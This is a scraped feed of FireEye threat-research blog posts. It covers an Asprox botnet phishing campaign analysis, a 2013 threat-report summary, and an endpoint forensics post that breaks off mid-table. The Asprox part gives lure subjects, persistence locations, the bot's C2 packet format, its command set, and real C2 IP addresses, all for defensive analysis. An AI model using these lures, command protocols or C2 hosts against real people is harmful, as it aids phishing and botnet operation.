 <p>This blog will cover the trends of the campaign, as well as provide
  a short technical analysis of the payload.</p>
 <p>
  <b>Campaign Details</b></p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig1.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png"
      alt="fig1" class="aligncenter  wp-image-5732 landscape-med"
      width="540" height="296" /></a></p>
 <p style="text-align: center;">Figure 1: Attack Architecture</p>
 <p>The campaign first appeared in late December of 2013 and has since
  been seen in fairly cyclical patterns each month. It appears that the
  threat actors behind this campaign are fairly responsive to published
  blogs and reports surrounding their malware techniques, tweaking their
  malware accordingly to continuously try and evade detection with success.</p>
 <p>In late 2013, malware labeled as Kuluoz, the specific spam component
  of the Asprox botnet, was discovered to be the main payload of what
  would become the first malicious email campaign. Since then, the
  threat actors have continuously tweaked the malware by changing its
  hardcoded strings, remote access commands, and encryption keys.</p>
 <p>Previously, Asprox malicious email campaigns targeted various
  industries in multiple countries and included a URL link in the body.
  The current version of Asprox includes a simple zipped email
  attachment that contains the malicious payload “exe.” Figure 2 below
  represents a sample message while <i>Figure 3</i> is an example of the
  various court-related email headers used in the campaign.</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig2.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig2.png"
      alt="fig2" class="aligncenter  wp-image-5731 landscape-med"
      width="546" height="273" /></a></p>
 <p style="text-align: center;">Figure 2 Email Sample</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig3.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig3.png"
      alt="fig3" class="aligncenter  wp-image-5730 landscape-sm"
      width="434" height="421" /></a></p>
 <p style="text-align: center;">Figure 3 Email Headers</p>
 <p>Some of the recurring campaign that Asporox used includes themes
  focused around airline tickets, postal services and license keys. In
  recent months however, the court notice and court request-themed
  emails appear to be the most successful phishing scheme theme for the campaign.</p>
 <p>The following list contains examples of email subject variations,
  specifically for the court notice theme:</p>
 <ul> <li>Urgent court notice</li> <li>Notice to Appear in Court</li>
    <li>Notice of appearance in court</li> <li>Warrant to appear</li>
    <li>Pretrial notice</li> <li>Court hearing notice</li> <li>Hearing
    of your case</li> <li>Mandatory court appearance</li> </ul>
 <p>The campaign appeared to increase in volume during the month of May.
  Figure 4 shows the increase in activity of Asprox compared to other
  crimewares towards the end of May specifically. Figure 5 highlights
  the regular monthly pattern of overall malicious emails. In
  comparison, Figure 6 is a compilation of all the hits from our analytics.</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig4.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig4.png"
      alt="fig4" class="aligncenter  wp-image-5729 landscape-med"
      width="540" height="220" /></a></p>
 <p style="text-align: center;">Figure 4 Worldwide Crimeware Activity</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig5.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig5.png"
      alt="fig5" class="aligncenter  wp-image-5728 landscape-med"
      width="540" height="256" /></a></p>
 <p style="text-align: center;">Figure 5 Overall Asprox Botnet tracking</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig6.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig6.png"
      alt="fig6" class="aligncenter  wp-image-5727 landscape-med"
      width="540" height="250" /></a></p>
 <p style="text-align: center;">Figure 6 Asprox Botnet Activity Unique Samples</p>
 <p>These malicious email campaign spikes revealed that FireEye
  appliances, with the support of DTI cloud, were able to provide a full
  picture of the campaign (blue), while only a fraction of the emailed
  malware samples could be detected by various Anti-Virus vendors (yellow).</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig7.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig7.png"
      alt="fig7" class="aligncenter  wp-image-5726 landscape-med"
      width="540" height="232" /></a></p>
 <p style="text-align: center;">Figure 7 FireEye Detection vs.
  Anti-Virus Detection</p>
 <p>By the end of May, we observed a big spike on the unique binaries
  associated with this malicious activity. Compared to the previous days
  where malware authors used just 10-40 unique MD5s or less per day, we
  saw about 6400 unique MD5s sent out on May 29<sup>th</sup>. That is a
  16,000% increase in unique MD5s over the usual malicious email
  campaign we’d observed. Compared to other recent email campaigns,
  Asprox uses a volume of unique samples for its campaign.</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig8.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig8.png"
      alt="fig8" class="aligncenter  wp-image-5725 landscape-med"
      width="540" height="229" /></a></p>
 <p style="text-align: center;">Figure 8 Asprox Campaign Unique Sample Tracking</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig9.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig9.png"
      alt="fig9" class="aligncenter  wp-image-5724 landscape-med"
      width="539" height="344" /></a></p>
 <p style="text-align: center;">Figure 9 Geographical Distribution of
  the Campaign</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig10.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig10.png"
      alt="fig10" class="aligncenter  wp-image-5723 landscape-med"
      width="539" height="276" /></a></p>
 <p style="text-align: center;">Figure 10 Distribution of Industries Affected</p>
 <p>
  <b>Brief Technical Analysis</b></p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig11.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig11.png"
      alt="fig11" class="aligncenter  wp-image-5722 landscape-med"
      width="540" height="296" /></a></p>
 <p style="text-align: center;">Figure 11 Attack Architecture</p>
 <p>
  <b>Infiltration</b></p>
 <p>The infiltration phase consists of the victim receiving a phishing
  email with a zipped attachment containing the malware payload
  disguised as an Office document. Figure 11 is an example of one of the
  more recent phishing attempts.</p>
 <p style="text-align: center;">
  <a href="/content/dam/legacy/blog/2014/06/fig12.png"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig12.png"
      alt="fig12" class="aligncenter  wp-image-5721 portrait-sm"
      width="114" height="133" /></a></p>
 <p style="text-align: center;">Figure 12 Malware Payload Icon</p>
 <p>
  <b>Evasion</b></p>
 <p>Once the victim executes the malicious payload, it begins to start
  an svchost.exe process and then injects its code into the newly
  created process. Once loaded into memory, the injected code is then
  unpacked as a DLL. Notice that Asprox uses a hardcoded mutex that can
  be found in its strings.</p>
 <ol> <li>Typical Mutex Generation<ol> <li>&quot;2GVWNQJz1&quot;</li>
    </ol> </li> <li>Create svchost.exe process</li> <li>Code injection
    into svchost.exe</li> </ol>
 <p>
  <b>Entrenchment</b></p>
 <p>Once the dll is running in memory it then creates a copy of itself
  in the following location:</p>
 <p>%LOCALAPPDATA%/[8 CHARACTERS].EXE</p>
 <p>Example filename:</p>
 <p>%LOCALAPPDATA%\lwftkkea.exe</p>
 <p>It’s important to note that the process will first check itself in
  the startup registry key, so a compromised endpoint will have the
  following registry populated with the executable:</p>
 <p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</p>
 <p>
  <b>Exfiltration/Communication</b></p>
 <p>The malware uses various encryption techniques to communicate with
  the command and control (C2) nodes. The communication uses an RSA
  (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base
  Cryptographic Provider while the payloads themselves are RC4
  encrypted. Each sample uses a default hardcoded public key shown below.</p>
 <p>Default Public Key</p>
 <p>-----BEGIN PUBLIC KEY-----</p>
 <p>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDCUAUdLJ1rmxx+bAndp+Cz6+5I'</p>
 <p>Kmgap2hn2df/UiVglAvvg2US9qbk65ixqw3dGN/9O9B30q5RD+xtZ6gl4ChBquqw</p>
 <p>jwxzGTVqJeexn5RHjtFR9lmJMYIwzoc/kMG8e6C/GaS2FCgY8oBpcESVyT2woV7U</p>
 <p>00SNFZ88nyVv33z9+wIDAQAB</p>
 <p>-----END PUBLIC KEY-----</p>
 <p>First Communication Packet</p>
 <p>Bot ID RC4 Encrypted URL</p>
 <p>POST /5DBA62A2529A51B506D197253469FA745E7634B4FC</p>
 <p>HTTP/1.1</p>
 <p>Accept: */*</p>
 <p>Content-Type: application/x-www-form-urlencoded</p>
 <p>User-Agent: &lt;host useragent&gt;</p>
 <p>Host: &lt;host ip&gt;:443</p>
 <p>Content-Length: 319</p>
 <p>Cache-Control: no-cache</p>
 <p>&lt;knock&gt;&lt;id&gt;5DBA62A247BC1F72B98B545736DEA65A&lt;/id&gt;&lt;group&gt;0206s&lt;/group&gt;&lt;src&gt;3&lt;/src&gt;&lt;transport&gt;0&lt;/transport&gt;&lt;time&gt;1881051166&lt;/time&gt;&lt;version&gt;1537&lt;/version&gt;&lt;status&gt;0&lt;/status&gt;&lt;debug&gt;none&lt;debug&gt;&lt;/knock&gt;</p>
 <p>
  <b>C2 Commands</b></p>
 <p>In comparison to the campaign at the end of 2013, the current
  campaign uses one of the newer versions of the Asprox family where
  threat actors added the command “ear.”</p>
 <p>if ( wcsicmp(Str1, L&quot;idl&quot;) )</p>
 <p style="padding-left: 30.0px;">{</p>
 <p style="padding-left: 30.0px;">if ( wcsicmp(Str1, L&quot;run&quot;) )</p>
 <p style="padding-left: 60.0px;">{</p>
 <p style="padding-left: 60.0px;">if ( wcsicmp(Str1, L&quot;rem&quot;) )</p>
 <p style="padding-left: 90.0px;">{</p>
 <p style="padding-left: 90.0px;">if ( wcsicmp(Str1, L&quot;ear&quot;)</p>
 <p style="padding-left: 120.0px;">{</p>
 <p style="padding-left: 120.0px;">if ( wcsicmp(Str1, L&quot;rdl&quot;) )</p>
 <p style="padding-left: 150.0px;">{</p>
 <p style="padding-left: 150.0px;">if ( wcsicmp(Str1, L&quot;red&quot;) )</p>
 <p style="padding-left: 180.0px;">{</p>
 <p style="padding-left: 180.0px;">if ( !wcsicmp(Str1, L&quot;upd&quot;) )</p>
 <table class="c09 c09-zebra has-data-label"> <tbody>
    <tr class="c09_tr c09_tr-th">
      <th scope="col" class="c09_td">C2 commands</th> <th scope="col"
      class="c09_td">Description</th> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>idl</span></span> <span
      class="c09_td_value is-hidden-mml">idl</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>This
            commands idles the process to wait for
        commands</span></span> <span
          class="c09_td_value is-hidden-mml">This commands idles the
          process to wait for commands</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>run</span></span> <span
      class="c09_td_value is-hidden-mml">run</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Download
            from a partner site and execute from a specified
        path</span></span> <span
          class="c09_td_value is-hidden-mml">Download from a partner
          site and execute from a specified path</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>rem</span></span> <span
      class="c09_td_value is-hidden-mml">rem</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Remove
        itself</span></span> <span
          class="c09_td_value is-hidden-mml">Remove itself</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>ear</span></span> <span
      class="c09_td_value is-hidden-mml">ear</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Download
            another executable and create autorun entry</span></span>
          <span class="c09_td_value is-hidden-mml">Download another
          executable and create autorun entry</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>rdl</span></span> <span
      class="c09_td_value is-hidden-mml">rdl</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Download,
            inject into svchost, and run</span></span> <span
          class="c09_td_value is-hidden-mml">Download, inject into
          svchost, and run</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>upd</span></span> <span
      class="c09_td_value is-hidden-mml">upd</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Download
            and update</span></span> <span
          class="c09_td_value is-hidden-mml">Download and
      update</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>red</span></span> <span
      class="c09_td_value is-hidden-mml">red</span></td> <td
          class="c09_td"><span class="is-visible-mml"> <span>Modify the
        registry</span></span> <span
          class="c09_td_value is-hidden-mml">Modify the
      registry</span></td> </tr></tbody></table>
 <p>
  <b>C2 Campaign Characteristics</b></p>
 <p style="text-align: left;">
  <a href="/content/dam/legacy/blog/2014/06/fig13.jpg"><img
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/06/fig13.jpg"
      alt="fig13" class="aligncenter  wp-image-5720 landscape-med"
      width="547" height="443" /></a></p>
 <p style="text-align: left;">For the two major malicious email campaign
  spikes in April and May of 2014, separate sets of C2 nodes were used
  for each major spike.</p>
 <table class="c09 c09-zebra has-data-label"> <tbody>
    <tr class="c09_tr c09_tr-th">
      <th scope="col" class="c09_td">April</th> <th scope="col"
      class="c09_td">May-June</th> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>94.23.24.58</span></span> <span
      class="c09_td_value is-hidden-mml">94.23.24.58</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>192.69.192.178</span></span> <span
      class="c09_td_value is-hidden-mml">192.69.192.178</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>94.23.43.184</span></span> <span
      class="c09_td_value is-hidden-mml">94.23.43.184</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>213.21.158.141</span></span> <span
      class="c09_td_value is-hidden-mml">213.21.158.141</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>1.234.53.27</span></span> <span
      class="c09_td_value is-hidden-mml">1.234.53.27</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>213.251.150.3</span></span> <span
      class="c09_td_value is-hidden-mml">213.251.150.3</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>84.124.94.52</span></span> <span
      class="c09_td_value is-hidden-mml">84.124.94.52</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>27.54.87.235</span></span> <span
      class="c09_td_value is-hidden-mml">27.54.87.235</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>133.242.134.76</span></span> <span
      class="c09_td_value is-hidden-mml">133.242.134.76</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>61.19.32.24</span></span> <span
      class="c09_td_value is-hidden-mml">61.19.32.24</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>173.45.78.226</span></span> <span
      class="c09_td_value is-hidden-mml">173.45.78.226</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>69.64.56.232</span></span> <span
      class="c09_td_value is-hidden-mml">69.64.56.232</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>37.59.9.98</span></span> <span
      class="c09_td_value is-hidden-mml">37.59.9.98</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>72.167.15.89</span></span> <span
      class="c09_td_value is-hidden-mml">72.167.15.89</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>188.93.74.192</span></span> <span
      class="c09_td_value is-hidden-mml">188.93.74.192</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>84.234.71.214</span></span> <span
      class="c09_td_value is-hidden-mml">84.234.71.214</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>187.16.250.214</span></span> <span
      class="c09_td_value is-hidden-mml">187.16.250.214</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>89.22.96.113</span></span> <span
      class="c09_td_value is-hidden-mml">89.22.96.113</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
        <span>85.214.220.78</span></span> <span
      class="c09_td_value is-hidden-mml">85.214.220.78</span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>89.232.63.147</span></span> <span
      class="c09_td_value is-hidden-mml">89.232.63.147</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
          <span></span></span> <span
      class="c09_td_value is-hidden-mml"></span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>91.121.20.71</span></span> <span
      class="c09_td_value is-hidden-mml">91.121.20.71</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
          <span></span></span> <span
      class="c09_td_value is-hidden-mml"></span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>91.212.253.253</span></span> <span
      class="c09_td_value is-hidden-mml">91.212.253.253</span></td> </tr>
    <tr class="c09_tr">
      <td class="c09_td"><span class="is-visible-mml">
          <span></span></span> <span
      class="c09_td_value is-hidden-mml"></span></td> <td
          class="c09_td"><span class="is-visible-mml">
        <span>91.228.77.15</span></span> <span
      class="c09_td_value is-hidden-mml">91.228.77.15</span></td> </tr></tbody></table>
 <p>
  <b>Conclusion</b></p>
 <p>The data reveals that each of the Asprox botnet’s malicious email
  campaigns changes its method of luring victims and C2 domains, as well
  as the technical details on monthly intervals. And, with each new
  improvement, it becomes more difficult for traditional security
  methods to detect certain types of malware.</p>
 <p>
  <b>Acknowledgements</b>:</p>
 <p>Nart Villeneuve, Jessa dela Torre, and David Sancho. Asprox Reborn.
  Trend Micro. 2013. http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-asprox-reborn.pdf</p>
http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html2014-06-16T14:00:00.000Z2020-07-24T06:58:43.748ZThe 2013 FireEye Advanced Threat Report!noemail@noemail.orgKenneth Geers<p>FireEye has just released its 2013 Advanced Threat Report (ATR),
  which provides a high-level overview of the computer network attacks
  that FireEye discovered last year.</p>
 <p>In this ATR, we focused almost exclusively on a small, but very
  important subset of our overall data analysis – the advanced
  persistent threat (APT).</p>
 <p>APTs, due to their organizational structure, mission focus, and
  likely some level of nation-state support, often pose a more serious
  danger to enterprises than a lone hacker or hacker group ever could.</p>
 <p>Over the long term, APTs are capable of cyber attacks that can rise
  to a strategic level, including widespread intellectual property
  theft, espionage, and attacks on national critical infrastructures.</p>
 <p>The data contained in this report is gleaned from the <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">FireEye
    Dynamic Threat Intelligence (DTI) cloud</a>, and is based on attack
  metrics shared by FireEye customers around the world.</p>
 <p>Its insight is derived from:</p>
 <ul> <li>39,504 cyber security incidents</li> <li>17,995 malware
  infections</li> <li>4,192 APT incidents</li> <li>22 million command
    and control (CnC) communications</li> <li>159 APT-associated malware
  families</li> <li>CnC infrastructure in 206 countries and
  territories</li> </ul>
 <p>
  <a
      href="/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png"><img
      class="alignnone size-full wp-image-4780 portrait-med"
      alt="FireEye 2013 Threat Report Final"
      src="https://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png"
      width="680" height="2989" /></a></p>
 <p>Based on our data, the U.S., South Korea, and Canada were the top
  APT targets in 2013; the U.S., Canada, and Germany were targeted by
  the highest number of unique malware families.</p>
 <p>The ATR describes attacks on 20+ industry verticals. Education,
  Finance, and High-Tech were the top overall targets, while Government,
  Services/Consulting, and High-Tech were targeted by the highest number
  of unique malware families.</p>
 <p>In 2013, FireEye discovered eleven zero-day attacks. In the first
  half of the year, Java was the most common target for zero-days; in
  the second half, FireEye observed a surge in Internet Explorer (IE)
  zero-days that were used in watering hole attacks, including against
  U.S. government websites.</p>
 <p>Last year, FireEye analyzed five times more Web-based security
  alerts than email-based alerts – possibly stemming from an increased
  awareness of spear phishing as well as a more widespread use of social media.</p>
 <p>In sum, the 2013 ATR offers strong evidence that malware infections
  occur within enterprises at an alarming rate, that attacker
  infrastructure is global in scope, and that advanced attackers
  continue to penetrate legacy defenses, such as firewalls and
  anti-virus (AV), with ease.</p>
http://www.fireeye.com/blog/threat-research/2014/02/the-2013-fireeye-advanced-threat-report.html2014-02-27T14:00:00.000Z2020-07-24T06:58:43.729ZUsing Real-Time Events in Investigationsnoemail@noemail.orgDaniel Pany<p>To understand what a threat actor did on a Windows system, analysts
  often turn to the tried and true sources of historical endpoint
  artifacts such as the Master File Table (MFT), registry hives, and
  Application Compatibility Cache (AppCompat). However, these evidence
  sources were not designed with detection or incident response in mind;
  crucial details may be omitted or cleared through anti-forensic
  methods. By looking at historical evidence alone, an analyst may not
  see the full story.</p>
 <p>Real-time events can be thought of as forensic artifacts
  specifically designed for detection and incident response, implemented
  through Enterprise Detection and Response (EDR) solutions or enhanced
  logging implementations like <a
  href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a>.
  During active-attacker endpoint investigations, <a
    href="/content/fireeye-www/en_US/services.html">FireEye Mandiant</a>
  has found real-time events to be useful in filling in the gaps of what
  an attacker did. These events record different types of system
  activities such as process execution, file write activity, network
  connections, and more.</p>
 <p>During incident response engagements, Mandiant uses <a
    href="/content/fireeye-www/en_US/products/endpoint-security.html">FireEye
    Endpoint Security</a> to track endpoint system events in real-time.
  This feature allows investigators to track an attacker on any system
  by alerting on and reviewing these real-time events. An analyst can
  use our solution’s built-in Audit Viewer or Redline to review
  real-time events.</p>
 <p>Let’s look at some examples of Windows real-time events available on
  our solution and how they can be leveraged during an investigation.
  Let’s assume the account <span
  class="code">TEST-DOMAIN\BackupAdmin</span> was an inactive
  Administrator account compromised by an attacker. Please note the
  examples provided in this post are based on real-time events observed
  during engagements but have been recreated or altered to preserve
  client confidentiality.</p>
 <h4>Process Execution Events</h4>
 <p>There are many historical process execution artifacts including <a
  href="/content/fireeye-www/en_US/blog/threat-research/2017/04/appcompatprocessor.html">AppCompat</a>,
    <a
  href="/content/fireeye-www/en_US/blog/threat-research/2015/06/caching_out_the_val.html">AmCache</a>,
    <a
    href="/content/fireeye-www/en_US/blog/threat-research/2016/12/do_you_see_what_icc.html">WMI
  CCM_RecentlyUsedApps</a>, and <a
  href="/content/fireeye-www/en_US/blog/threat-research/2013/08/execute.html">more</a>.
  A single artifact rarely covers all the useful details relating to a
  process's execution, but real-time process execution events change
  that. Our solution’s real-time process execution events record
  execution time, full process path, process identification number
  (PID), parent process path, parent PID, user, command line arguments,
  and even the process MD5 hash.</p>
 <p>Table 1 provides an example of a real-time process execution event
  recorded by our solution.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="150" valign="top"><p>
          <b>Field</b></p> </td> <td width="474" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Timestamp (UTC)</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">2020-03-10 16:40:58.235</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Sequence Number</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">2879512</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>PID</p> </td> <td width="474" valign="top"><p>
          <span class="code">9392</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Process Path</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Username</p> </td> <td width="474" valign="top"><p>
          <span class="code">TEST-DOMAIN\BackupAdmin</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Parent PID</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">9103</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Parent Process Path</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">C:\Windows\System32\cmd.exe</span></p>
      </td> </tr>
    <tr>
      <td width="150" valign="top"><p>EventType</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">Start</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>ProcessCmdLine</p> </td> <td
        width="474" valign="top"><p>
          <span
            class="code">&quot;C:\Windows\Temp\legitservice.exe&quot; 
            -b -m</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Process MD5 Hash</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">a823bc31395539816e8e4664e884550f</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Example real-time process execution event</span></p>
 <p>Based on this real-time process execution event, the process <span
  class="code">C:\Windows\System32\cmd.exe</span> with PID 9103 executed
  the file <span class="code">C:\Windows\Temp\legitservice.exe</span>
  with PID 9392 and the MD5 hash <span
  class="code">a823bc31395539816e8e4664e884550f</span>. This new process
  used the command line arguments <span class="code">-b</span> <span
  class="code">-m</span> under the user context of <span class="code">TEST-DOMAIN\BackupAdmin</span>.</p>
 <p>We can compare this real-time event with what an analyst might see
  in other process execution artifacts. Table 2 provides an example
  AppCompat entry for the same executed process. Note the recorded
  timestamp is for the last modified time of the file, not the process
  start time.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="150" valign="top"><p>
          <b>Field</b></p> </td> <td width="474" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>File Last<br /> Modified (UTC)</p>
      </td> <td width="474" valign="top"><p>
          <span class="code">2020-03-07 23:48:09</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>File Path</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Executed Flag</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">TRUE</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: Example AppCompat entry</span></p>
 <p>Table 3 provides an example AmCache entry. Note the last modified
  time of the registry key can usually be used to determine the process
  start time and this artifact includes the SHA1 hash of the file.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="150" valign="top"><p>
          <b>Field</b></p> </td> <td width="474" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Registry Key<br /> Last Modified
        (UTC)</p> </td> <td width="474" valign="top"><p>
          <span class="code">2020-03-10 16:40:58</span></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>File Path</p> </td> <td
        width="474" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="150" valign="top"><p>File Sha1 Hash</p> </td> <td
        width="474" valign="top"><p>
          <span
        class="code">2b2e04ab822ef34969b7d04642bae47385be425c</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 3: Example AmCache entry</span></p>
 <p>Table 4 provides an example Windows Event Log process creation
  event. Note this artifact includes the PID in hexadecimal notation,
  details about the parent process, and even a field for where the
  process command line arguments should be. In this example the command
  line arguments are not present because they are <a
    href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">disabled
    by default</a> and Mandiant rarely sees this policy enabled by
  clients on investigations.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="750"> <tbody>
    <tr>
      <td width="90" valign="top"><p>
          <b>Field</b></p> </td> <td width="534" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="90" valign="top"><p>Write Time (UTC)</p> </td> <td
        width="534" valign="top"><p>
          <span class="code">2020-03-10 16:40:58</span></p> </td> </tr>
    <tr>
      <td width="90" valign="top"><p>Log</p> </td> <td width="534" valign="top"><p>
          <span class="code">Security</span></p> </td> </tr>
    <tr>
      <td width="90" valign="top"><p>Source</p> </td> <td width="534" valign="top"><p>
          <span class="code">Microsoft Windows security</span></p> </td> </tr>
    <tr>
      <td width="90" valign="top"><p>EID</p> </td> <td width="534" valign="top"><p>
          <span class="code">4688</span></p> </td> </tr>
    <tr>
      <td width="90" valign="top"><p>Message</p> </td> <td width="534" valign="top"><p>
          <span class="code">A new process has been created.</span></p> <p>
          <span class="code">Creator Subject:<br />        Security
            ID:             TEST-DOMAIN\BackupAdmin<br />        Account
            Name:            BackupAdmin<br />        Account
            Domain:          TEST-DOMAIN<br />        Logon
            ID:                0x6D6AD</span></p> <p>
          <span class="code">Target Subject:<br />        Security
            ID:             NULL SID<br />        Account
            Name:            -<br />        Account Domain:         
            -<br />        Logon ID:                0x0</span></p> <p>
          <span class="code">Process Information:<br />        New
            Process ID:          0x24b0<br />        New Process
            Name:        C:\Windows\Temp\legitservice.exe<br />       
            Token Elevation Type:    %%1938<br />        Mandatory
            Label:         Mandatory Label\Medium Mandatory Level<br />
                  Creator Process ID:      0x238f<br />        Creator
            Process Name:    C:\Windows\System32\cmd.exe<br />       
            Process Command Line:    </span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 4: Example Windows event log process
    creation event</span></p>
 <p>If we combine the evidence available in AmCache with a fully
  detailed Windows Event Log process creation event, we could match the
  evidence available in the real-time event except for a small
  difference in file hash types.</p>
 <h4>File Write Events</h4>
 <p>An attacker may choose to modify or delete important evidence. If an
  attacker uses a file shredding tool like Sysinternal’s SDelete, it is
  unlikely the analyst will recover the original contents of the file.
  Our solution’s real-time file write events are incredibly useful in
  situations like this because they record the MD5 hash of the files
  written and partial contents of the file. File write events also
  record which process created or modified the file in question.</p>
 <p>Table 5 provides an example of a real-time file write event recorded
  by our solution.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
